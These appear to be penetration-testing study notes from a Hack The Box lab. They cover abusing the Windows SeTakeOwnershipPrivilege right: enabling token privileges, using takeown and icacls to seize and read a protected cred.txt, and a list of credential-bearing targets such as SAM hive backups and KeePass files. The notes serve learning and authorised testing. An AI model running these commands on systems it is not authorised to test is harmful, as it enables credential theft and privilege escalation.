**[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects) grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes**
The setting can be set in Group Policy under:

- `Computer Configuration` ⇾ `Windows Settings` ⇾ `Security Settings` ⇾ `Local Policies` ⇾ `User Rights Assignment`

### leveraging the permission
```
whoami /priv
```
![[Pasted image 20241010142157.png]]

### Enabling 

[[Enable-Privilege.ps1]] - Create the file, load it into import-module, run it
```powershell-session
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv
```


### Choose target file
Find a file that you want to take control over, cred file, password file etc
```powershell-session
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
 
```

### Check ownership
```powershell-session
cmd /c dir /q 'C:\Department Shares\Private\IT'
```


### Taking Ownership of the File
use [[takedown]]
```powershell-session
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
```

### confirm ownership
```powershell-session
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

```

If cant read still then modify ACL
### Modifying the File ACL

```powershell-session
cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```
Change ACL
```powershell-session
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

### Read the file
```powershell-session
cat 'C:\Department Shares\Private\IT\cred.txt'
```


## When to Use?

#### Files of Interest

Some local files of interest may include:

SeTakeOwnershipPrivilege

```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

We may also come across `.kdbx` KeePass database files, OneNote notebooks, files such as `passwords.*`, `pass.*`, `creds.*`, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.